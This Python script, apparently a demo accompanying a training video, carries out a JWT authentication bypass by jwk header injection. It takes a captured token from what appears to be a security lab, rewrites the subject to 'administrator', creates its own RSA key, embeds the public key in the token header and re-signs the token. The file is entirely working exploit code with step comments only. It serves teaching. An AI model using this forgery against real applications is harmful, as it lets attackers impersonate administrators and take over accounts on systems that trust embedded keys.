# Demo script for 'JWT Authentication Bypass via jwk Header Injection' video: https://youtu.be/t-RfzyW0iqA
import jwt
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


token = 'eyJraWQiOiI0NGEwMDVjYy03YzgyLTQ0ZTUtOWRmOC0xMWE5NTJkOTdkZGYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzI4NzIwOSwic3ViIjoid2llbmVyIn0.lLTMD55Pyxs7BYsPOwXGuJV2vuwKSo0JdnAzR9C4qa4Mcihh01-xsxRBqjUgDdE_7ot2_gyUk5VEVn9LLdnlepSc1OodezZNKEmzwqJr_8tjYMe9qnnQS3JKD9zZE0HXwWw5leETvkyUXzr-0Y3_Pwuh3jYJrbBfhMlKxpxzTX_rgWpb-P-F4mXPzziwQDxoom0u6AoZjh5TR15zMq8W2s-Rl5825NwpJJwcbk_Q9HOQMJt_IGu4Hg4Ej3Pxn0R_7-krFmCIgIthtTweWn28-cncgBiq0misImLbBc9igL72FatJgHlXZw7C1HPGNoRC2xQfMLj50H_D40NQtN--wQ'

def to_base64url(data):
    """Converte i byte in Base64URL senza padding."""
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')


# Step 2: Decodifica il JWT senza verificare la firma
header, payload, signature = token.split('.')
decoded_header = json.loads(base64.urlsafe_b64decode(header + "=="))
decoded_payload = json.loads(base64.urlsafe_b64decode(payload + "=="))

print("Decoded header:", json.dumps(decoded_header, indent=2))
print("Decoded payload:", json.dumps(decoded_payload, indent=2))

# Step 3: Modifica il token
decoded_payload['sub'] = 'administrator'
print(f"Modified payload: {decoded_payload}\n")

# Step 4: Genera una nuova coppia di chiavi RSA
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()

# Esporta la chiave pubblica nei parametri `n` e `e`
numbers = public_key.public_numbers()
n = to_base64url(numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big'))
e = to_base64url(numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big'))

# Step 5: Crea l'header JWK
jwk = {
    "kty": "RSA",
    "e": e,
    "kid": decoded_header["kid"],
    "n": n
}

# Step 6: Aggiorna l'header JWT con il nuovo JWK
decoded_header['jwk'] = jwk

print(f"Modified header: {decoded_header}\n")

# Step 7: Firma il nuovo token
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

new_token = jwt.encode(
    payload=decoded_payload,
    key=private_key_pem,
    algorithm="RS256",
    headers=decoded_header
)

print("Nuovo JWT:", new_token)
